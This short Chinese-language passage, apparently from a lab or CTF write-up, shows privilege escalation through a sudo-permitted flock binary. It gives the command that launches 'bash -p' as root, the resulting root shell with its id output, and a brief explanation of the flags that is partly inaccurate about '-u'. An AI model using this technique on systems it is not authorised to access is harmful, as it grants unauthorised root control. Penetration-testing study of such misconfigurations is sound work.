flock 提权

flock 是文件锁工具，但它可以在获取锁后执行任意命令。根据 GTFOBins，利用方式如下：

adrian@vulny:~$ sudo /usr/bin/flock -u /tmp/lockfile /bin/bash -p
root@vulny:# id
uid=0(root) gid=0(root) groups=0(root)

-u 参数表示释放锁后继续执行后续命令，/bin/bash -p 以特权模式启动 bash，获得 root shell。
